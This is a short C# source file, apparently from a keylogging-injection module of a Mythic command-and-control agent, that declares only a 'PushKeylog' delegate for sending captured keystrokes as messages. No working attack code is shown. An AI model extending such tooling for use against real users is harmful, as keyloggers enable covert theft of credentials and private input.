﻿using SystemAgentInterop.Interfaces;

namespace KeylogInject
{
    public static class Delegates
    {
        public delegate bool PushKeylog(IMythicMessage info);
    }
}
